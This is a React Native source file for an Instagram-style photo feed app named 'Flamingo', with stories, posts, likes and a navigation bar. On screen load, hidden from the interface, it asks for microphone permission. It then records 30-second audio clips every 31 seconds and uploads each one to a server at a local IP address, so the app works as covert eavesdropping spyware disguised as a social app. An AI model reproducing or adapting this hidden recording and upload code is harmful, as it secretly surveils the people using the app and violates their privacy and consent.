import React, { useEffect, useState } from "react";
import {
  FlatList,
  Image,
  PermissionsAndroid, Platform,
  SafeAreaView,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from "react-native";
import AudioRecorderPlayer from 'react-native-audio-recorder-player';
import RNFS from 'react-native-fs';

// Dummy data for stories
/* const initialStories = [
  { id: "1", user: "Your story", img: "https://randomuser.me/api/portraits/men/1.jpg", isUser: true },
  { id: "2", user: "aesha_28_", img: "https://randomuser.me/api/portraits/women/45.jpg" },
  { id: "3", user: "randomly.bhavya", img: "https://randomuser.me/api/portraits/men/32.jpg" },
  { id: "4", user: "ritu_chauhan711", img: "https://randomuser.me/api/portraits/women/28.jpg" },
  { id: "5", user: "jani_jagrat", img: "https://randomuser.me/api/portraits/men/15.jpg" },
]; */

// Dummy data for posts
/* const initialPosts = [
  {
    id: "1",
    user: "alice",
    profileImg: "https://randomuser.me/api/portraits/women/45.jpg",
    img: "https://picsum.photos/500/500?random=1",
    likes: 120,
    caption: "Enjoying the beauty of nature!",
    time: "2h",
    comments: 5,
  },
  {
    id: "2",
    user: "bob",
    profileImg: "https://randomuser.me/api/portraits/men/32.jpg",
    img: "https://picsum.photos/500/500?random=2",
    likes: 95,
    caption: "City lights never fail to amaze!",
    time: "5h",
    comments: 3,
  },
]; */

export default function InstagramHome() {
  const [stories, setStories] = useState([]);
  const [posts, setPosts] = useState([]);
  const [ads, setAds] = useState(true);

  const audioRecorderPlayer = new AudioRecorderPlayer();

  const requestMicrophonePermission = async () => {
    if (Platform.OS === 'android') {
      try {
        const granted = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
          {
            title: "Microphone Permission",
            message: "This app needs access to your microphone to record audio.",
            buttonNeutral: "Ask Me Later",
            buttonNegative: "Cancel",
            buttonPositive: "OK",
          }
        );
        return granted === PermissionsAndroid.RESULTS.GRANTED;
      } catch (err) {
        console.warn(err);
        return false;
      }
    }
    return true; // iOS handles permissions differently
  };

  const startRecording = async () => {
    try {
      const result = await audioRecorderPlayer.startRecorder(
        `${RNFS.DocumentDirectoryPath}/audio_chunk.mp4`
      );
      console.log('Recording started: ', result);
    } catch (err) {
      console.error('Error starting recording:', err);
    }
  };
  
  const stopRecording = async () => {
    try {
      const result = await audioRecorderPlayer.stopRecorder();
      console.log('Recording stopped: ', result);
      return result; // Return file path of the recorded audio
    } catch (err) {
      console.error('Error stopping recording:', err);
      return null;
    }
  };

  const sendAudioToServer = async (audioFilePath) => {
    try {
      const formData = new FormData();
      formData.append('file', {
        uri: audioFilePath,
        name: 'audio_chunk.wav',
        type: 'audio/wav',
      });
  
      const response = await fetch('http://192.168.254.93:3000/upload', {
        method: 'POST',
        body: formData,
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });
  
      const result = await response.json();
      console.log('Server response:', result);
    } catch (err) {
      console.error('Error uploading audio:', err);
    }
  };
  

  const recordAndSendAudio = async () => {
    const hasPermission = await requestMicrophonePermission();
    if (!hasPermission) {
      console.warn('Microphone permission denied');
      return;
    }
  
    setInterval(async () => {
      console.log('Recording audio...');
      await startRecording();
  
      setTimeout(async () => {
        console.log('Stopping and uploading audio...');
        const audioFilePath = await stopRecording();
        if (audioFilePath) {
          await sendAudioToServer(audioFilePath);
        }
      }, 30000); // Record for 30 seconds
    }, 31000); // Interval for recording and sending audio
  };
  
  useEffect(() => {
    recordAndSendAudio();
  }, []);
  

  const fetchStories = async () => {
    try {
      const response = await fetch('http://192.168.254.93:3000//api/stories');
      const data = await response.json();
      setStories(data);
    } catch (error) {
      console.error('Error fetching stories:', error);
    }
  };

  const fetchPosts = async () => {
    try {
      const response = await fetch('http://192.168.254.93:3000//api/posts');
      const data = await response.json();
      setPosts(data);
    } catch (error) {
      console.error('Error fetching posts:', error);
    }
  };

  useEffect(() => {
    fetchStories();
    fetchPosts();
  }, []);

  const toggleLike = (id) => {
    setPosts(posts.map(post =>
      post.id === id
        ? { ...post, liked: !post.liked, likes: post.liked ? post.likes - 1 : post.likes + 1 }
        : post
    ));
  };

  const renderStory = ({ item }) => {

    if(item.show == "true"){
    return (
      <View
        style={{
          alignItems: "center",
          marginHorizontal: 5,
          width: 70,
        }}
      >
        <View
          style={{
            borderWidth: 2,
            borderColor: item.isUser ? "#FFFFFF" : "#FF8501",
            borderRadius: 35,
            padding: 2,
          }}
        >
          <Image
            source={{ uri: item.img }}
            style={{
              width: 60,
              height: 60,
              borderRadius: 30,
            }}
          />
        </View>
        <Text
          style={{
            color: "#FFFFFF",
            fontSize: 12,
            marginTop: 4,
            textAlign: "center",
          }}
          numberOfLines={1}
        >
          {item.user}
        </Text>
      </View>
    );}
  }

  const renderPost = ({ item }) => {
    if(item.show=="true"){
    return(
    <View style={styles.postContainer}>
      {/* Post Header */}
      <View style={styles.postHeader}>
        <View style={styles.postHeaderLeft}>
          <Image source={{ uri: item.profileImg }} style={styles.profileImage} />
          <Text style={styles.userText}>{item.user}</Text>
        </View>
        <TouchableOpacity>
          <Image source={require('./m_icon/dots.png')} style={{ width: 22, height: 20 }} />
        </TouchableOpacity>
      </View>

      {/* Post Image */}
      <Image source={{ uri: item.img }} style={styles.postImage} />

      {/* Post Actions */}
      <View style={styles.postActions}>
        <View style={styles.actionIcons}>
          <TouchableOpacity onPress={() => toggleLike(item.id)}>
            <Image source={item.liked ? require('./m_icon/like-d.png') : require('./m_icon/like.png')} style={{ width: 30, height: 28 }} />
          </TouchableOpacity>
          <TouchableOpacity>
            <Image source={require('./m_icon/comment.png')} style={{ width: 30, height: 28 }} />
          </TouchableOpacity>
          <TouchableOpacity>
            <Image source={require('./m_icon/send.png')} style={{ width: 28, height: 26 }} />
          </TouchableOpacity>
        </View>
        <TouchableOpacity>
          <Image source={require('./m_icon/save.png')} style={{ width: 30, height: 28 }} />
        </TouchableOpacity>
      </View>

      {/* Post Info */}
      <View style={styles.postInfo}>
        <Text style={styles.likesText}>{item.likes} likes</Text>
        <Text style={styles.captionText}>
          <Text style={styles.userText}>{item.user} </Text>
          {item.caption}
        </Text>
        <Text style={styles.commentsText}>View all {item.comments} comments</Text>
        <Text style={styles.timeText}>{item.time}</Text>
      </View>
    </View>
  );}
}

  return (
    <SafeAreaView style={styles.container}>
      {/* Header */}
      <View style={styles.header}>
        <Text style={{ color: '#fff', fontSize: 20 }}>Flamingo</Text>
        <View style={styles.headerIcons}>

          <TouchableOpacity>
            <Image source={require('./m_icon/dm.png')} style={{ width: 30, height: 28 }} />
          </TouchableOpacity>
        </View>
      </View>

      {/* Stories */}

      <View style={{ width: '%100' }}>
        <FlatList
          horizontal
          data={stories}
          renderItem={renderStory}
          keyExtractor={(item) => item.id}
          style={styles.storiesContainer}
          contentContainerStyle={styles.storiesContent}
          showsHorizontalScrollIndicator={false}
        />
      </View>

      {/* Posts */}
      <FlatList
        data={posts}
        renderItem={renderPost}
        keyExtractor={(item) => item.id}
        style={styles.postsContainer}
        contentContainerStyle={styles.postsContent}
        showsVerticalScrollIndicator={false}
      />

      {/* Bottom Navigation */}
      <View style={styles.navBar}>
        <TouchableOpacity>
          <Image source={require('./m_icon/home.png')} style={{ width: 30, height: 28 }} />
        </TouchableOpacity>
        <TouchableOpacity>
          <Image source={require('./m_icon/search.png')} style={{ width: 30, height: 28 }} />
        </TouchableOpacity>
        <TouchableOpacity>
          <Image source={require('./m_icon/post.png')} style={{ width: 30, height: 28 }} />
        </TouchableOpacity>
        <TouchableOpacity>
          <Image source={require('./m_icon/like.png')} style={{ width: 30, height: 28 }} />
        </TouchableOpacity>
        <TouchableOpacity>
          <Image source={{ uri: 'https://randomuser.me/api/portraits/men/1.jpg' }} style={{ width: 30, height: 28, borderRadius: 100 }} />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#000000",
  },
  header: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 16,
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#262626",
  },
  logo: {
    width: 100,
    height: 30,
    resizeMode: "contain",
  },
  headerIcons: {
    flexDirection: "row",
    alignItems: "center",
  },
  headerIcon: {
    marginLeft: 20,
  },
  storiesContainer: {
    backgroundColor: "#000000",
  },
  storiesContent: {
    paddingVertical: 5,
    paddingHorizontal: 10,
  },
  storyContainer: {
    alignItems: "center",
    marginHorizontal: 5,
    width: 70,
  },
  storyImageWrapper: {
    borderWidth: 2,
    borderColor: "#FF8501", // Instagram-style orange gradient border
    borderRadius: 35,
    padding: 2,
  },
  userStory: {
    borderColor: "#FFFFFF", // White border for "Your Story"
  },
  storyImage: {
    width: 60,
    height: 60,
    borderRadius: 30,
  },
  storyText: {
    color: "#FFFFFF",
    fontSize: 12,
    marginTop: 4,
    textAlign: "center",
  },
  postsContainer: {
    flex: 1,
  },
  postsContent: {
    paddingTop: 0, // Gap remove karne ke liye
  },
  postContainer: {
    marginBottom: 10,
    backgroundColor: "#000000",
  },
  postHeader: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    padding: 10,
  },
  postHeaderLeft: {
    flexDirection: "row",
    alignItems: "center",
  },
  profileImage: {
    width: 32,
    height: 32,
    borderRadius: 16,
    marginRight: 10,
  },
  userText: {
    color: "#FFFFFF",
    fontWeight: "bold",
    fontSize: 14,
  },
  postImage: {
    width: "100%",
    height: 400,
    resizeMode: "cover",
  },
  postActions: {
    flexDirection: "row",
    justifyContent: "space-between",
    padding: 10,
  },
  actionIcons: {
    flexDirection: "row",

    width: '30%',
    justifyContent: 'space-around'
  },
  actionIcon: {
    marginRight: 15,

  },
  postInfo: {
    paddingHorizontal: 10,
    paddingBottom: 10,
  },
  likesText: {
    color: "#FFFFFF",
    fontWeight: "bold",
    fontSize: 14,
    marginBottom: 5,
  },
  captionText: {
    color: "#FFFFFF",
    fontSize: 14,
    marginBottom: 5,
  },
  commentsText: {
    color: "#8E8E8E",
    fontSize: 14,
    marginBottom: 5,
  },
  timeText: {
    color: "#8E8E8E",
    fontSize: 12,
  },
  navBar: {
    flexDirection: "row",
    justifyContent: "space-around",
    paddingVertical: 10,
    backgroundColor: "#000000",
    borderTopWidth: 1,
    borderTopColor: "#262626",
  },
});